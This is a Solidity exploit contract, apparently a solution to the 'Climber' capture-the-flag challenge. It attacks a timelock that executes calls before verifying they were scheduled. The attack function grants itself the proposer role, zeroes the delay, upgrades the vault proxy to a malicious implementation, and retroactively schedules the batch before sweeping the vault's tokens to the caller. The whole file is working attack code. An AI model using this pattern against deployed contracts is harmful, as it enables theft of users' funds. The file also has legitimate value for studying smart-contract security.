// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVaultVulnerable.sol";

contract ClimberAttacker {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    ClimberTimelock climberTimelock;

    constructor(address payable _climberTimelock) {
        climberTimelock = ClimberTimelock(_climberTimelock);
    }

    function attack(
        address _vaultProxy,
        address _vulnerableVault,
        address _tokenAddress
    ) external {
        salt = "salt";
        targets.push(address(climberTimelock));
        targets.push(address(climberTimelock));
        targets.push(address(_vaultProxy));
        targets.push(address(this));

        values.push(0);
        values.push(0);
        values.push(0);
        values.push(0);

        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        dataElements.push(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(_vulnerableVault)
            )
        );
        dataElements.push(abi.encodeWithSignature("schedule()"));
        climberTimelock.execute(targets, values, dataElements, salt);
        ClimberVaultVulnerable(_vaultProxy).sweepFunds(
            _tokenAddress,
            msg.sender
        );
    }

    function schedule() external {
        climberTimelock.schedule(targets, values, dataElements, salt);
    }

    receive() external payable {}
}
